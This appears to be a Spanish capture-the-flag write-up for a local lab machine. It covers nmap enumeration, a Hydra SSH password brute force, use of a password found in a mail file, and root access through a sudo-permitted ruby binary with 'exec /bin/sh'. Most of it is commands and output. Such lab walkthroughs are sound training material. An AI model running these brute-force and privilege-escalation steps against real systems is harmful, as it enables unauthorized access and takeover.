#hydra #password-brute-force #gtfobins #abusing-sudo #ruby

![](../../../Images/Pasted%20image%2020241008071813.png)
# Enumeración

## Nmap

El escaneo de **nmap** nos enseña la existencia de un servicio **SSH** i un servicio **HTTP** funcionando.

```
> nmap --open --min-rate 10000 -Pn -n -oN scans/allTCPPorts $target

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 17:03 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000013s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

```
> nmap -oN scans/targetedTCPPorts -sCV $target -p 22,80                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 17:04 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
```

## Website (80 TCP Port)

En el sitio web no vemos nada pero mirando el código fuente de la página descubrimos dos posibles nombres de usuarios.

![](../../../Images/Pasted%20image%2020241008170742.png)
# Usuario Camilo

Logramos conseguir una contraseña para el usuario **Mario** realizando un ataque de fuerza bruta de contraseñas con **Hydra** y logramos acceder en el sistems objectivo.

```
> hydra -l camilo -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 17:07:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 17:08:02
```

```
ssh camilo@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:52z4CT20OpL7G8YfPhcdERem6Sq+z8868LngvNGXRlA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
camilo@172.17.0.2's password:
$
```
# Usuario Juan

Una vez dentro del sistema realizamos una enumeración y logramos encontrar un correo electrónico con una contraseña. 

```
camilo@a8996f6fcde9:/var/mail/camilo$ cat correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Probando la contraseña encontrada con los diferentes usuario que existen logramos un movimiento lateral hacia el usuario **Juan**.

```
camilo@a8996f6fcde9:/var/mail/camilo$ su juan
Password:
$ id
uid=1000(juan) gid=1000(juan) groups=1000(juan)
$
```

# Escalada de privilegios

Una vez dentro investigamos los comandos que podemos ejecutar con permisos `sudo` y vemos que podemos ejecutar el binario **ruby**.

```
sudo -l
Matching Defaults entries for juan on a8996f6fcde9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on a8996f6fcde9:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Si investigamos en la página web de [GTFOBINS](https://gtfobins.github.io/) vemos como podemos conseguir una shell con permisos sudo.

![](../../../Images/Pasted%20image%2020241008172202.png)

```
$ sudo ruby -e 'exec "/bin/sh"'
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
#
```